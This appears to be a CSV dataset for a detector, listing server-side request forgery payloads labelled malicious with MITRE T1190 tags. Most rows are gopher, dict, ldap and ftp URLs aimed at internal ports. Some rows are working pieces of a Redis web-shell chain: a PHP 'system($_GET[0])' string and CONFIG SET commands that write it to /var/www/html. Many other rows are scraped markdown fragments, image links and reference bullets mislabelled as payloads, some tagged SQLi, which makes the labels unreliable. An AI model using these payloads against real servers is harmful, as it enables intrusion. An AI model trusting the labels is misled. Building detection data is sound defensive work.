Payload,Signature,AttackType,Severity,MITRE,Label,Description
gopher://127.0.0.1:25:80/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:27017,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:6379/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:8080/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:8080/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:5432/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:5432,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:27017/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
"SET%20mykey%20""<\x3Fphp system($_GET[0])\x3F>""",CMDi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:80/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
| modifier1 | (1 byte)  | 0 (%00)     |,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:22/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
_%2500%251d%25a9%25c1%2500%2520%2500%2501%2500%2500%2500%2500%2500%2500%2507%2565%2578%2561%256d%2570%256c%2565%2503%256c%2561%2562%2500%2500%25fc%2500%2501,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:6379/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:22/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:22/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:3306/_,SSRF,Server Side Request Forgery,High,T1190,Malicious,Advanced Server Side Request Forgery variant
gopher://127.0.0.1:25:3306/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [W3 Total Cache](https://github.com/assetnote/blind-ssrf-chains#w3),SQLi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:3306/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:443/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:27017/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:6379/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:80/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [OpenTSDB](https://github.com/assetnote/blind-ssrf-chains#opentsdb),SQLi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:5432/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:443/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:22/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
| modifier2 | (1 byte)  | 0 (%00)     |,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:22/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:8080/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Redis](https://github.com/assetnote/blind-ssrf-chains#redis),SQLi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:5432/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:22/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:5432/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:8080,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:22/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:6379/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Docker](https://github.com/assetnote/blind-ssrf-chains#docker),SQLi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:22/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:3306/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:6379,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:27017,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:8080/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:6379/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:22/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:80/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:5432/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:5432/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:8080,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:443,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:22/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:6379/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:443/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
CONFIG%20SET%20dbfilename%20file.php,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:8080/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:5432,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:6379/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:8080/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:27017/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
_MAIL%20FROM:,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:5432/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
/%2561dmin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:443/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:27017/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:3306/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:3306/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* `0://evil.com:80;http://google.com:80/`,CMDi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:22/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
CONFIG%20SET%20dir%20/var/www/html,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:5432/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Confluence](https://github.com/assetnote/blind-ssrf-chains#confluence),SQLi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:3306/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:80/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:443/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
TESTUDPPACKET,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:27017,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:443/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
![SSRF stream](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_stream.png?raw=true),GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
![https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.png?raw=true](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.jpg?raw=true),GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
%0astats%0aquit,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* Daemon socket option: <https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option>,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Apache Druid](https://github.com/assetnote/blind-ssrf-chains#druid),GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Apache Solr](https://github.com/assetnote/blind-ssrf-chains#solr),GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Apache Struts](https://github.com/assetnote/blind-ssrf-chains#struts),GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Apache Tomcat](https://github.com/assetnote/blind-ssrf-chains#tomcat),COMMAND_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Confluence](https://github.com/assetnote/blind-ssrf-chains#confluence),GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Docker](https://github.com/assetnote/blind-ssrf-chains#docker),GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Elasticsearch](https://github.com/assetnote/blind-ssrf-chains#elasticsearch),GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Gitlab Prometheus Redis Exporter](https://github.com/assetnote/blind-ssrf-chains#redisexporter),GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Hashicorp Consul](https://github.com/assetnote/blind-ssrf-chains#consul),GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Hystrix Dashboard](https://github.com/assetnote/blind-ssrf-chains#hystrix),GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [JBoss](https://github.com/assetnote/blind-ssrf-chains#jboss),GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Jenkins](https://github.com/assetnote/blind-ssrf-chains#jenkins),GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Jira](https://github.com/assetnote/blind-ssrf-chains#jira),GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
